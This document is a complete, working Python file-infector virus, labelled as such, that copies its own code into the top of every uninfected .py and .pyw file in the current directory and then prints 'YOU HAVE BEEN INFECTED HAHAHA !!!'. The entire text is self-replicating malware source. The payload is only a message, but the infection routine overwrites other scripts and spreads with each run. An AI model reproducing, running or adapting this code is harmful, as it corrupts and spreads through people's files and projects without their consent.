# VIRUS SAYS HI!

import sys
import glob

virusCode = []
currentFileName = sys.argv[0]

with open(currentFileName, 'r') as f:
    lines = f.readlines()

selfReplicatingPart = False
for line in lines:
    if line == "# VIRUS SAYS HI!\n":
        selfReplicatingPart = True
    if selfReplicatingPart:
        virusCode.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break


pythonFiles = glob.glob('*.py') + glob.glob('*.pyw')

for file in pythonFiles:
    if(file == sys.argv[0]):
        continue

    with open(file, 'r') as f:
        fileCode = f.readlines()

    infected = False

    for line in fileCode:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    if not infected:
        finalCode = []
        finalCode.extend(virusCode)
        finalCode.extend('\n')
        finalCode.extend(fileCode)

        with open(file, 'w') as f:
            f.writelines(finalCode)

def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")

malicious_code()

# VIRUS SAYS BYE!